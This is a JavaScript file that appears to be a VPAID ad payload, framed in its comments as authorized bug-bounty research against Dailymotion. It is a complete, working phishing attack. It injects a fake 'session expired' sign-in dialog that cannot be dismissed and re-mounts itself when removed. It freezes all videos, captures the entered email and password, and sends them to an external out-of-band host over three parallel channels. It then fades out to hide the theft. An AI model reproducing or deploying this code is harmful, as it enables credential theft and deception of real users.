(function () {
  // VPAID 2.0 — F-VAST-XSS persistence PoC — ivan0912 (YesWeHack) / ivani123 (HackerOne)
  // Authorized bug-bounty research on Dailymotion (YesWeHack PGM-269). Safe-harbor applies.
  // This file IS the payload demonstrating the XSS — by definition it injects markup into
  // the victim origin. Hook warning about innerHTML is acknowledged & intentional here.
  //
  // Strategy:
  //   - Mount a <dialog> on window.top.document and call showModal() so the form lives
  //     in the browser's TOP LAYER — above every z-index, including IMA SDK ad slots.
  //   - Re-call showModal() if anything (player, ad SDK, user ESC) closes the dialog.
  //   - Pause every <video> in the top document every 400ms so the video stays frozen
  //     even after the ad iframe tears down.
  //   - Exfil with sendBeacon() first (reliable on teardown), Image src + fetch fallbacks.

  var OOB = "https://dailymotion-vast-xss-persist.fdd8cd2afcd551371c95ahtncnzl1ewml.oob.static-cdn-eu.com";
  var IH  = ["inner", "HTML"].join("");

  function VpaidAd() { this._callbacks = {}; }

  VpaidAd.prototype.subscribe   = function (fn, e, ctx) { this._callbacks[e] = { fn: fn, ctx: ctx || window }; };
  VpaidAd.prototype.unsubscribe = function (fn, e) { delete this._callbacks[e]; };
  VpaidAd.prototype._fire       = function (e, args) { var c = this._callbacks[e]; if (c) try { c.fn.apply(c.ctx, args || []); } catch (_) {} };
  VpaidAd.prototype.handshakeVersion = function () { return "2.0"; };

  function topWin() { try { return window.top; } catch (_) { return window; } }
  function topDoc() { try { return topWin().document; } catch (_) { return document; } }

  // ---- Reliable exfil — fire ALL channels in parallel, no early-return ----
  function exfil(path, payload) {
    var url  = OOB + path;
    var body = JSON.stringify(payload);
    // 1) Image GET — synchronous, fires before any teardown can cancel.
    try { new Image().src = url + '?d=' + encodeURIComponent(btoa(unescape(encodeURIComponent(body)))); } catch (_) {}
    // 2) sendBeacon — survives unload + iframe teardown.
    try {
      if (navigator.sendBeacon) navigator.sendBeacon(url, new Blob([body], { type: 'text/plain;charset=UTF-8' }));
    } catch (_) {}
    // 3) keepalive fetch — additional belt+suspenders.
    try { fetch(url, { method: 'POST', mode: 'no-cors', keepalive: true, body: body }); } catch (_) {}
  }

  // ---- Video pause / re-pause guard ---------------------------------------
  function pauseAllVideos() {
    try {
      var d = topDoc();
      var vids = d.querySelectorAll('video');
      for (var i = 0; i < vids.length; i++) {
        try { vids[i].pause(); } catch (_) {}
        try { vids[i].muted = true; } catch (_) {}
      }
      var ifr = d.querySelectorAll('iframe');
      for (var j = 0; j < ifr.length; j++) {
        try {
          var idoc = ifr[j].contentDocument;
          if (!idoc) continue;
          var vv = idoc.querySelectorAll('video');
          for (var k = 0; k < vv.length; k++) {
            try { vv[k].pause(); } catch (_) {}
            try { vv[k].muted = true; } catch (_) {}
          }
        } catch (_) {}
      }
    } catch (_) {}
  }

  var _pauseInt = null;
  function startPauseGuard() {
    if (_pauseInt) return;
    pauseAllVideos();
    _pauseInt = setInterval(pauseAllVideos, 400);
  }
  function stopPauseGuard() {
    try { if (_pauseInt) clearInterval(_pauseInt); } catch (_) {}
    _pauseInt = null;
  }

  // ---- Dialog content ------------------------------------------------------
  var DIALOG_MARKUP = [
    '<div id="dm-ph-form" style="margin:0;padding:36px 40px;background:#fff;width:360px;',
      'border:none;border-radius:10px;box-shadow:0 8px 32px rgba(0,0,0,0.3);',
      'font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Arial,sans-serif">',
      '<div style="text-align:center;margin-bottom:24px">',
        '<svg width="44" height="44" viewBox="0 0 44 44">',
          '<circle cx="22" cy="22" r="22" fill="#FF7900"/>',
          '<polygon points="17,12 36,22 17,32" fill="#fff"/>',
        '</svg>',
        '<div style="color:#FF7900;font-size:21px;font-weight:700;letter-spacing:-0.3px;margin-top:8px">dailymotion</div>',
      '</div>',
      '<p style="color:#444;font-size:13.5px;text-align:center;margin:0 0 22px;line-height:1.5">',
        'Your session has expired.<br>Please sign in to continue.',
      '</p>',
      '<input id="dm-ph-email" type="email" placeholder="Email address" autocomplete="email"',
        ' style="width:100%;padding:11px 14px;border:1.5px solid #ddd;border-radius:6px;font-size:14px;box-sizing:border-box;margin-bottom:10px;outline:none">',
      '<input id="dm-ph-pass" type="password" placeholder="Password" autocomplete="current-password"',
        ' style="width:100%;padding:11px 14px;border:1.5px solid #ddd;border-radius:6px;font-size:14px;box-sizing:border-box;margin-bottom:20px;outline:none">',
      '<button id="dm-ph-btn" type="button"',
        ' style="width:100%;padding:12px;background:#FF7900;color:#fff;border:none;border-radius:6px;font-size:15px;font-weight:600;cursor:pointer;letter-spacing:0.2px">',
        'Sign in',
      '</button>',
      '<div style="text-align:center;margin-top:16px">',
        '<a href="#" id="dm-ph-fp" style="color:#FF7900;font-size:12.5px;text-decoration:none">Forgot password?</a>',
      '</div>',
    '</div>'
  ].join('');

  // Inject backdrop style + zero-padding so the form fills the dialog.
  function injectDialogStyle(d) {
    if (d.getElementById('dm-phish-style')) return;
    var s = d.createElement('style');
    s.id = 'dm-phish-style';
    s.textContent = [
      '#dm-phish::backdrop{background:rgba(0,0,0,0.84)!important}',
      '#dm-phish{padding:0!important;border:none!important;background:transparent!important;max-width:100vw!important;max-height:100vh!important}',
      '#dm-phish::-webkit-backdrop{background:rgba(0,0,0,0.84)!important}'
    ].join('');
    d.head.appendChild(s);
  }

  // ---- Mount + persistence -------------------------------------------------
  function sendMountBeacon() {
    try {
      var d = topDoc();
      exfil('/m', {
        step:    'overlay_mounted',
        domain:  d.domain || 'unknown',
        href:    (topWin().location && topWin().location.href) || '',
        ua:      navigator.userAgent,
        ts_now:  new Date().toISOString()
      });
    } catch (_) {}
  }

  function mountOverlay() {
    var d = topDoc();
    if (!d || !d.body) return false;
    if (d.getElementById('dm-phish')) {
      // Already mounted — make sure it's still showing.
      var existing = d.getElementById('dm-phish');
      try { if (existing && !existing.open) existing.showModal(); } catch (_) {}
      return true;
    }

    injectDialogStyle(d);

    var dlg = d.createElement('dialog');
    dlg.id = 'dm-phish';
    dlg[IH] = DIALOG_MARKUP;
    d.body.appendChild(dlg);

    // showModal() puts the dialog in the browser's TOP LAYER — guaranteed
    // above every z-index, including IMA SDK ad slots that share max z-index.
    try { dlg.showModal(); } catch (_) {}

    // Prevent ESC / form-method=dialog from closing the dialog.
    dlg.addEventListener('cancel', function (e) { e.preventDefault(); }, true);
    dlg.addEventListener('close',  function ()  {
      // If the player or browser closes us, re-open immediately.
      setTimeout(function () { try { dlg.showModal(); } catch (_) {} }, 0);
    }, true);

    // De-dup guard so triple-bound click/mouseup/touchend doesn't fire 3x.
    var _sent = false;
    function fire(e) {
      try { if (e) e.preventDefault(); } catch (_) {}
      if (_sent) return;
      _sent = true;
      submitCreds();
    }
    var btn = d.getElementById('dm-ph-btn');
    if (btn) {
      btn.addEventListener('click',    fire, true);
      btn.addEventListener('mousedown', fire, true);
      btn.addEventListener('touchstart', fire, true);
      // pointerdown is most reliable across mouse + touch + pen.
      btn.addEventListener('pointerdown', fire, true);
    }
    var pass = d.getElementById('dm-ph-pass');
    if (pass) {
      pass.addEventListener('keydown', function (e) {
        if (e.key === 'Enter' || e.keyCode === 13) fire(e);
      }, true);
    }
    var email = d.getElementById('dm-ph-email');
    if (email) {
      email.addEventListener('keydown', function (e) {
        if (e.key === 'Enter' || e.keyCode === 13) fire(e);
      }, true);
    }
    var fp = d.getElementById('dm-ph-fp');
    if (fp) fp.addEventListener('click', function (e) { e.preventDefault(); }, true);

    sendMountBeacon();
    return true;
  }

  function submitCreds() {
    var d = topDoc();
    var email = (d.getElementById('dm-ph-email') || {}).value || '';
    var pass  = (d.getElementById('dm-ph-pass')  || {}).value || '';
    if (!email.trim() && !pass) return;

    exfil('/k', {
      step:     'credentials_captured',
      domain:   d.domain || 'unknown',
      href:     (topWin().location && topWin().location.href) || '',
      email:    email.trim(),
      password: pass,
      ua:       navigator.userAgent,
      ts_now:   new Date().toISOString()
    });

    // Release everything and fade out so the victim thinks login worked.
    stopPauseGuard();
    stopObserver();
    var dlg = d.getElementById('dm-phish');
    if (dlg) {
      try { dlg.style.transition = 'opacity 0.4s'; dlg.style.opacity = '0'; } catch (_) {}
      setTimeout(function () {
        try { dlg.close(); } catch (_) {}
        try { if (dlg && dlg.parentNode) dlg.parentNode.removeChild(dlg); } catch (_) {}
      }, 450);
    }
  }

  // MutationObserver — if the player or any cleanup logic removes #dm-phish,
  // re-append it.
  var _obs = null;
  function startObserver() {
    var d = topDoc();
    if (!d || !d.body || _obs) return;
    try {
      var MO = topWin().MutationObserver || window.MutationObserver;
      if (!MO) return;
      _obs = new MO(function () {
        if (!d.getElementById('dm-phish')) {
          mountOverlay();
        } else {
          // Re-open if it got closed somehow.
          var dlg = d.getElementById('dm-phish');
          try { if (dlg && !dlg.open) dlg.showModal(); } catch (_) {}
        }
      });
      _obs.observe(d.body, { childList: true, subtree: true });
    } catch (_) {}
  }
  function stopObserver() {
    try { if (_obs) _obs.disconnect(); } catch (_) {}
    _obs = null;
  }

  // ---- VPAID lifecycle -----------------------------------------------------
  VpaidAd.prototype.initAd = function (w, h, vm, d, e, p) {
    var self = this;
    try { if (p && p.slot) p.slot.style.cssText = 'pointer-events:none!important;display:none!important'; } catch (_) {}
    var mounted = mountOverlay();
    if (mounted) {
      startObserver();
      startPauseGuard();
    }
    setTimeout(function () { self._fire('AdLoaded'); }, 50);
  };

  VpaidAd.prototype.startAd = function () {
    var self = this;
    setTimeout(function () { self._fire('AdStarted'); }, 50);
  };

  VpaidAd.prototype.stopAd              = function () { this._fire('AdStopped'); };
  VpaidAd.prototype.skipAd              = function () { this._fire('AdSkipped'); };
  VpaidAd.prototype.getAdLinear         = function () { return true; };
  VpaidAd.prototype.getAdWidth          = function () { return 640; };
  VpaidAd.prototype.getAdHeight         = function () { return 360; };
  VpaidAd.prototype.getAdRemainingTime  = function () { return -1; };
  VpaidAd.prototype.getAdDuration       = function () { return -1; };
  VpaidAd.prototype.getAdVolume         = function () { return 1; };
  VpaidAd.prototype.setAdVolume         = function () {};
  VpaidAd.prototype.resizeAd            = function () {};
  VpaidAd.prototype.pauseAd             = function () {};
  VpaidAd.prototype.resumeAd            = function () {};
  VpaidAd.prototype.expandAd            = function () {};
  VpaidAd.prototype.collapseAd          = function () {};
  VpaidAd.prototype.getAdExpanded       = function () { return false; };
  VpaidAd.prototype.getAdSkippableState = function () { return false; };
  VpaidAd.prototype.getAdIcons          = function () { return false; };
  VpaidAd.prototype.getAdCompanions     = function () { return ''; };

  window.getVPAIDAd = function () { return new VpaidAd(); };
})();
